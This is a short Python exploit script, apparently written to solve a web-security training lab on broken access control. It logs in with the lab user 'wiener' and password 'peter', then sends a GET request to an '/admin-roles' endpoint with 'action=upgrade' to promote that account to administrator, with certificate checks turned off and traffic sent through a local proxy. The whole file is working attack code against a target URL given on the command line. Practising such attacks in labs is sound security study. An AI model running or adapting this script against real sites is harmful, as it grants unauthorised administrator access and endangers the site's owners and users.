import requests as rs
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}


def promote_to_admin(s,url):
    
    # login as wiener
    login_url = url + '/login'
    
    data_login = {
        'username' : 'wiener',
        'password' : 'peter'
    }
    
    r = s.post(login_url,data=data_login,verify=False,proxies=proxies)
    resp = r.text
    if 'Log out'  in resp:
        sys.stdout.write("[+] Wiener logged in successfully\n")



        # Exploit -> promote user to admin
        admin_role_url = url + '/admin-roles?username=wiener&action=upgrade'
        r = s.get(admin_role_url,verify=False,proxies=proxies)
        resp = r.text

        if 'Admin panel' in resp:
            sys.stdout.write("[+] Wiener promoted to admin successfully\n")
        else:
            sys.stdout.write("[-] Wiener not promoted to admin\n")
            sys.exit(1)
    else:
        sys.stdout.write("[-] Wiener not logged in\n")
        sys.exit(1)



def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage : python3 %s <URL>\n" % sys.argv[0])
        sys.exit(1)
    s = rs.Session()
    url = sys.argv[1]

    promote_to_admin(s,url)
    

if __name__ == '__main__':
    main()